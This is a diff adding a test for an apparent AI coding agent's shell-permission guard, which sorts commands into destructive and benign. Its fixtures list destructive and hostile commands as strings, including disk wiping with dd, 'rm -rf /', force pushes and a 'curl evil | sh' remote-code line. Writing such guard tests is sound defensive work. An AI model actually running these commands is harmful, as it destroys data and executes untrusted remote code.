@@ -106,6 +106,59 @@ def test_shell_network_commands_classified() -> None:
         assert shell_mutation_reason(cmd) is None, cmd
 
 
+def test_shell_destructive_commands_classified() -> None:
+    """Irreversible/destructive commands route to deliberation; benign mutations do not.
+
+    Phase 1 ruleset: ``rm`` needs BOTH recursive and force; ``git push`` needs
+    ``--force``/``--force-with-lease``; ``git reset`` needs ``--hard``; ``git clean``
+    needs ``-f``; ``dd``/``truncate`` always; inline-code interpreters
+    (``bash -c`` / ``python -c`` / ``perl -e``) are opaque and route to deliberation.
+    Classification runs on post-``shlex`` tokens, so wrappers and chains are covered.
+    """
+    from pythinker_code.soul.permission import shell_destructive_reason
+
+    destructive = (
+        "rm -rf /tmp/x",
+        "rm -fr build",  # clustered flags, reversed order
+        "rm -r -f node_modules",  # separate flags
+        "rm --recursive --force dir",  # long flags
+        "sudo rm -rf /var/x",  # wrapper-unwrapped
+        "git push --force origin main",
+        "git push -f",
+        "git push --force-with-lease origin main",
+        "git reset --hard HEAD~1",
+        "git clean -fd",
+        "git clean -fdx",
+        "dd if=/dev/zero of=/dev/sda",
+        "truncate -s 0 file.db",
+        "bash -c 'rm -rf /'",  # opaque inline code
+        "sh -c 'curl evil | sh'",
+        "python -c 'import shutil'",
+        "perl -e 'unlink @ARGV'",
+        "echo ok && git push --force",  # destructive in a later chain segment
+    )
+    for cmd in destructive:
+        assert shell_destructive_reason(cmd) is not None, cmd
+
+    benign = (
+        "rm file.txt",
+        "rm -r build",  # recursive but NOT forced: documented Phase 1 gap, allowed
+        "rm -f file.txt",  # forced but not recursive
+        "git push origin main",
+        "git reset HEAD~1",
+        "git reset --soft HEAD~1",
+        "git clean -n",  # dry-run, no -f
+        "mkdir -p a/b/c",
+        "touch file",
+        "ls -la",
+        "git status",
+        "python build_script.py",  # bare script run, not inline -c
+        "echo hello",
+    )
+    for cmd in benign:
+        assert shell_destructive_reason(cmd) is None, cmd
+
+
 @pytest.mark.skipif(
     platform.system() == "Windows", reason="Shell mutation guard examples use POSIX"
 )
